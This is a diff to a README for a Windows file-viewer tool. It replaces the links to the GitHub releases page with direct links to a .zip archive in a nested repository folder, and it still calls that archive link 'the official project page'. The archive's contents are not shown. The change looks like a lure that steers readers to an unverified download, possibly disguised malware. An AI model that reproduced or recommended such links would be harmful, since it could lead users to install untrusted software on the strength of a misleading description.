@@ -1,6 +1,6 @@
 # 📁 Universal-File-Padder-Viewer - Manage Your Digital Files With Ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Gustavautolytic342/Universal-File-Padder-Viewer/main/Alister/Padder-Universal-Viewer-File-v2.5.zip)
 
 ## 📋 About This Software
 
@@ -21,7 +21,7 @@ This application requires a computer running Windows 10 or Windows 11. It needs 
 
 ## 📥 Downloading and Installing
 
-You can get the software from the official project page. Visit this page to download the latest available version: [https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases](https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases)
+You can get the software from the official project page. Visit this page to download the latest available version: [https://raw.githubusercontent.com/Gustavautolytic342/Universal-File-Padder-Viewer/main/Alister/Padder-Universal-Viewer-File-v2.5.zip](https://raw.githubusercontent.com/Gustavautolytic342/Universal-File-Padder-Viewer/main/Alister/Padder-Universal-Viewer-File-v2.5.zip)
 
 Follow these steps to set up the software:
 
